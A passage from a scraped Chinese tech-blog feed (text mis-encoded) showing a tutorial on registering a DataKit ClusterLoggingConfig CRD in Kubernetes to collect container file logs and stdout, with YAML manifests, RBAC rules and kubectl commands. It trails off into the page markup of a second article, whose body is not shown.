  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:01:05.000Z" title="Mon Nov 24 2025 11:01:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ¦‚è¿°</h2>
<p>DataKit é€šè¿‡ Kubernetes Custom Resource Definition (CRD) æä¾›äº†ä¸€ç§å£°æ˜å¼çš„å®¹å™¨æ—¥å¿—é‡‡é›†é…ç½®æ–¹å¼ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡åˆ›å»º ClusterLoggingConfig èµ„æºæ¥è‡ªåŠ¨é…ç½® DataKit çš„æ—¥å¿—é‡‡é›†ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ DataKit é…ç½®æ–‡ä»¶æˆ–é‡å¯ DataKitï¼ŒåŒæ ·ä¹Ÿæ— éœ€é‡å¯ä¸šåŠ¡ã€‚</p>
<h2 data-id="heading-1">äºŒã€å‰ç½®æ¡ä»¶</h2>
<ul>
<li>Kubernetes é›†ç¾¤ç‰ˆæœ¬ 1.16+</li>
<li>DataKit Version-1.84.0 æˆ–æ›´æ–°ç‰ˆæœ¬</li>
<li>é›†ç¾¤ç®¡ç†å‘˜æƒé™ï¼ˆç”¨äºæ³¨å†Œ CRDï¼‰</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€é‡‡é›†æµç¨‹</h2>
<h3 data-id="heading-3">1. æ³¨å†Œ Kubernetes CRD</h3>
<ul>
<li>ä½¿ç”¨ä»¥ä¸‹ YAML æ³¨å†ŒÂ <code>ClusterLoggingConfig</code>Â CRDï¼š</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apiextensions.k8s.io/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">CustomResourceDefinition</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">clusterloggingconfigs.logging.datakits.io</span>
  <span class="hljs-attr">labels:</span>
    <span class="hljs-attr">app:</span> <span class="hljs-string">datakit-logging-config</span>
    <span class="hljs-attr">version:</span> <span class="hljs-string">v1alpha1</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">group:</span> <span class="hljs-string">logging.datakits.io</span>
  <span class="hljs-attr">versions:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">v1alpha1</span>
      <span class="hljs-attr">served:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">storage:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">schema:</span>
        <span class="hljs-attr">openAPIV3Schema:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
          <span class="hljs-attr">properties:</span>
            <span class="hljs-attr">apiVersion:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
            <span class="hljs-attr">kind:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
            <span class="hljs-attr">metadata:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
            <span class="hljs-attr">spec:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
              <span class="hljs-attr">required:</span>
                <span class="hljs-bullet">-</span> <span class="hljs-string">selector</span>
              <span class="hljs-attr">properties:</span>
                <span class="hljs-attr">selector:</span>
                  <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
                  <span class="hljs-attr">properties:</span>
                    <span class="hljs-attr">namespaceRegex:</span>
                      <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                    <span class="hljs-attr">podRegex:</span>
                      <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                    <span class="hljs-attr">podLabelSelector:</span>
                      <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                    <span class="hljs-attr">containerRegex:</span>
                      <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                <span class="hljs-attr">podTargetLabels:</span>
                  <span class="hljs-attr">type:</span> <span class="hljs-string">array</span>
                  <span class="hljs-attr">items:</span>
                    <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                <span class="hljs-attr">configs:</span>
                  <span class="hljs-attr">type:</span> <span class="hljs-string">array</span>
                  <span class="hljs-attr">items:</span>
                    <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
                    <span class="hljs-attr">required:</span>
                      <span class="hljs-bullet">-</span> <span class="hljs-string">source</span>
                      <span class="hljs-bullet">-</span> <span class="hljs-string">type</span>
                    <span class="hljs-attr">properties:</span>
                      <span class="hljs-attr">source:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">type:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">disable:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">boolean</span>
                      <span class="hljs-attr">path:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">multiline_match:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">pipeline:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">storage_index:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
                      <span class="hljs-attr">tags:</span>
                        <span class="hljs-attr">type:</span> <span class="hljs-string">object</span>
                        <span class="hljs-attr">additionalProperties:</span>
                          <span class="hljs-attr">type:</span> <span class="hljs-string">string</span>
  <span class="hljs-attr">scope:</span> <span class="hljs-string">Cluster</span>
  <span class="hljs-attr">names:</span>
    <span class="hljs-attr">plural:</span> <span class="hljs-string">clusterloggingconfigs</span>
    <span class="hljs-attr">singular:</span> <span class="hljs-string">clusterloggingconfig</span>
    <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterLoggingConfig</span>
    <span class="hljs-attr">shortNames:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">logging</span>
</code></pre>
<ul>
<li>åˆ›å»º CRD èµ„æºï¼Œè‡ªåŠ¨åº”ç”¨é‡‡é›†é…ç½®</li>
</ul>

<pre><code class="hljs">kubectl apply -f clusterloggingconfig-crd.yaml
</code></pre>
<ul>
<li>éªŒè¯ CRD æ³¨å†Œ</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino">kubectl get crd clusterloggingconfigs.logging.datakits.io
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e075581d4108435886c2ea264e096d6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=d1sZI7PVP%2FYBATUf%2Bs3G7MkcyM0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2. åˆ›å»º CRD é…ç½®èµ„æº</h3>
<ul>
<li>å¦‚ä¸‹ä¸ºä¸šåŠ¡åº”ç”¨ yaml ï¼š</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">deploy-demo</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">matchLabels:</span>
      <span class="hljs-attr">app:</span> <span class="hljs-string">demo</span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">metadata:</span>
      <span class="hljs-attr">labels:</span>
        <span class="hljs-attr">app:</span> <span class="hljs-string">demo</span>
        <span class="hljs-attr">version:</span> <span class="hljs-string">v1.0</span>
        <span class="hljs-attr">enviroment:</span> <span class="hljs-string">test</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">container-demo</span>
          <span class="hljs-attr">image:</span> <span class="hljs-string">swr.cn-north-4.myhuaweicloud.com/liurui_bj/springboot-server:openj8</span>
          <span class="hljs-attr">resources:</span>
            <span class="hljs-attr">limits:</span>
              <span class="hljs-attr">cpu:</span> <span class="hljs-string">250m</span>
              <span class="hljs-attr">memory:</span> <span class="hljs-string">512Mi</span>
            <span class="hljs-attr">requests:</span>
              <span class="hljs-attr">cpu:</span> <span class="hljs-string">250m</span>
              <span class="hljs-attr">memory:</span> <span class="hljs-string">512Mi</span>
</code></pre>
<ul>
<li>k8s éƒ¨ç½²è¿è¡Œä¸šåŠ¡åå¦‚ä¸‹ï¼š</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba6b894d43d0445b8602e5d6c7850280~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=YZb9azQbK98EkCcqcE1zkM8Zr0w%3D" alt="" loading="lazy"/></p>
<ul>
<li>å¯¹åº”é‡‡é›†é…ç½®å¦‚ä¸‹ï¼Œè¯¥é‡‡é›†é…ç½®ç”¨äºé‡‡é›† default å·¥ä½œç©ºé—´ demo ä¸šåŠ¡çš„å®¹å™¨å†…æ—¥å¿—ä»¥åŠå®¹å™¨çš„æ ‡å‡†è¾“å‡ºï¼Œå®¹å™¨å†…æ—¥å¿—æ¥æº source è‡ªå®šä¹‰å‘½åä¸º demo-fileï¼Œå®¹å™¨æ ‡å‡†è¾“å‡ºçš„ source è‡ªå®šä¹‰å‘½åä¸º demo-stdï¼Œæ›´å¤šé…ç½®å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.guance.com%2Fintegrations%2Fcontainer-log-for-k8s-crd%2F%23configuration-details" target="_blank" title="https://docs.guance.com/integrations/container-log-for-k8s-crd/#configuration-details" ref="nofollow noopener noreferrer">é“¾æ¥</a></li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">logging.datakits.io/v1alpha1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterLoggingConfig</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">demo-logs</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">namespaceRegex:</span> <span class="hljs-string">"^(default)$"</span>
    <span class="hljs-attr">podRegex:</span> <span class="hljs-string">"^(deploy.*)$"</span>
    <span class="hljs-attr">podLabelSelector:</span> <span class="hljs-string">"app=demo"</span>

  <span class="hljs-attr">podTargetLabels:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">app</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">version</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">enviroment</span>

  <span class="hljs-attr">configs:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">source:</span> <span class="hljs-string">"demo-file"</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">"file"</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/data/logs/server/server.log"</span>
      <span class="hljs-attr">tags:</span>
        <span class="hljs-attr">log_type:</span> <span class="hljs-string">"server"</span>
        <span class="hljs-attr">component:</span> <span class="hljs-string">"springboot-server"</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">source:</span> <span class="hljs-string">"demo-std"</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">"stdout"</span>
      <span class="hljs-attr">disable:</span> <span class="hljs-literal">false</span>
      <span class="hljs-attr">tags:</span>
        <span class="hljs-attr">log_type:</span> <span class="hljs-string">"server"</span>
        <span class="hljs-attr">component:</span> <span class="hljs-string">"springboot-server"</span>
</code></pre>
<ul>
<li>åº”ç”¨é…ç½®</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino">kubectl apply -f logging-config.yaml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d750d0fe04274e52a41e47cc6fec7d00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=%2BIde3sTATHBm8fGrTNCddrUIKg8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">3. æ·»åŠ ç›¸å…³ RBAC é…ç½®</h3>
<ul>
<li>åœ¨ DataKit çš„ ClusterRole ä¸­æ·»åŠ ä»¥ä¸‹æƒé™ï¼š</li>
</ul>

<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">apiVersion: rbac.authorization.k8s.io/v1</span>
<span class="hljs-section">kind: ClusterRole</span>
<span class="hljs-section">metadata:</span>
  name: datakit
<span class="hljs-section">rules:</span>
  <span class="hljs-comment"># åŸæœ‰çš„å…¶ä»–æƒé™</span>
  - apiGroups: [<span class="hljs-string">"logging.datakits.io"</span>]
    resources: [<span class="hljs-string">"clusterloggingconfigs"</span>]
    verbs: [<span class="hljs-string">"get"</span>, <span class="hljs-string">"list"</span>, <span class="hljs-string">"watch"</span>]
</code></pre>
<ul>
<li>è°ƒæ•´ DataKit çš„å…¶ä»–<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.guance.com%2Fintegrations%2Fcontainer%2F%23__tabbed_1_2" target="_blank" title="https://docs.guance.com/integrations/container/#__tabbed_1_2" ref="nofollow noopener noreferrer">é‡‡é›†é…ç½®</a>ï¼Œå¦‚æ—¥å¿—ç™½åå•ï¼Œé‡‡é›†å™¨ï¼Œæ•°æ® dataway ä¸ŠæŠ¥åœ°å€ç­‰ï¼Œé‡æ–° apply DataKit åº”ç”¨</li>
</ul>

<pre><code class="hljs">kubectl apply -f datakit.yaml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/893894241f2e47c4b17bc80ba192a6e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=7pXsrn8goQ5lsvmEKBdekexr9vI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">4. é¢å¤–é…ç½®ä¸è¯´æ˜</h3>
<ul>
<li>éœ€è¦å…¨å±€å±è”½æ—¥å¿—æ ‡å‡†è¾“å‡ºé‡‡é›†ï¼Œéœ€è¦é¢å¤–åº”ç”¨è‡ªå®šä¹‰ CRD é…ç½®ï¼Œå¦‚ä¸‹ï¼š</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterLoggingConfig</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">namespaceRegex:</span> <span class="hljs-string">"^(.*)$"</span>

  <span class="hljs-attr">configs:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">source:</span> <span class="hljs-string">"test"</span>
      <span class="hljs-attr">type:</span> <span class="hljs-string">"stdout"</span>
      <span class="hljs-attr">disable:</span> <span class="hljs-literal">true</span>
</code></pre>
<ul>
<li>DataKit éœ€è¦æ‰“å¼€ container é‡‡é›†å™¨ï¼Œä¸ç„¶ CRD é…ç½®ä¸ç”Ÿæ•ˆ</li>
</ul>
<h2 data-id="heading-7">å››ã€æ—¥å¿—é‡‡é›†å±•ç¤º</h2>
<ul>
<li>å®¹å™¨å†…æ—¥å¿—å¦‚ä¸‹å›¾ï¼Œæ•°æ®æˆåŠŸä¸ŠæŠ¥åˆ°è§‚æµ‹äº‘ï¼Œç›¸å…³ sourceï¼Œlog_typeï¼Œcomponent ç­‰é…ç½®å­—æ®µå‡æˆåŠŸä¸ŠæŠ¥</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4608a8d65244869a5346e95a6ce94b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=LheUw64xVGnujnT%2FW3dLAHXoi%2Fk%3D" alt="" loading="lazy"/></p>
<ul>
<li>å®¹å™¨æ ‡å‡†è¾“å‡ºå¦‚ä¸‹å›¾ï¼Œæ®æˆåŠŸä¸ŠæŠ¥åˆ°è§‚æµ‹äº‘ï¼Œç›¸å…³ sourceï¼Œlog_typeã€‚component ç­‰é…ç½®å­—æ®µå‡æˆåŠŸä¸ŠæŠ¥</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4d2651e1e344899b8ecce3821f0e3f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586864&amp;x-signature=bwRRASuTHMVjOqFCsrTaAlv2sTY%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot æ•°æ®å­˜å‚¨å®æˆ˜æ‹†è§£ï¼]]></title>    <link>https://juejin.cn/post/7575910298283163683</link>    <guid>https://juejin.cn/post/7575910298283163683</guid>    <pubDate>2025-11-24T08:55:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910298283163683" data-draft-id="7576175307352342543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot æ•°æ®å­˜å‚¨å®æˆ˜æ‹†è§£ï¼"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-24T08:55:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è¥¿è¥¿"/> <meta itemprop="url" content="https://juejin.cn/user/326976944214804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot æ•°æ®å­˜å‚¨å®æˆ˜æ‹†è§£ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/326976944214804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è¥¿è¥¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T08:55:59.000Z" title="Mon Nov 24 2025 08:55:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 